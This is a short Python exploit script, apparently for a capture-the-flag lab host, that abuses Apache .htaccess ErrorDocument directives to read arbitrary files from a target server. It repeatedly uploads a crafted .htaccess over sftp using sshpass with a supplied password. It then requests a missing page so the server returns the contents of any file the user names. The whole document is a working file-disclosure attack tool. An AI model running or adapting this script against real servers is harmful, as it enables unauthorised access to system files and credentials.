#!/usr/bin/python3 
import os
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-u", "--username", required=True, help="Username for login")
parser.add_argument("-p", "--password", required=True, help="Password for login")
parser.add_argument("--url", required=True, help="Target URL")
args = parser.parse_args()

try:
    while True:
        file = input("file: ")
        htaccess_content = f"ErrorDocument 404 %{{file:{file}}}\n"
        with open(".htaccess", "w") as f:
            f.write(htaccess_content)
        os.system(f"echo \"put .htaccess public_html/.htaccess\" | sshpass -p '{args.password}' sftp {args.username}@zero.vl > /dev/null 2>&1")
        print("\n"+os.popen(f"curl -s {args.url}/nothing").read())
        
except KeyboardInterrupt:
    exit()
